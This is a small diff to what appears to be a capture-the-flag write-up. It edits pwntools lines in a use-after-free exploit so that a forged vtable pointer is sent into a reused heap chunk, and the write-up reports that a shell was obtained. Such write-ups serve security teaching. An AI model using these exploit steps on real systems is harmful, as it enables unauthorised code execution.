@@ -40,7 +40,8 @@ p.sendline("2") ; p.recv()
 ```
 It's the ``w`` heap chunk containing vtable that is going to be reused the first time. So we have to store the payload twice, since ``m->introduce`` is called before ``w->introduce``.
 ```python
-p.sendline("2") ; p.recv()
+p.sendline("2")
+p.send(p64(new_vtable_1F)) ; p.recv()
 p.sendline("1") ;p.recv()
 ```
 We got the shell.
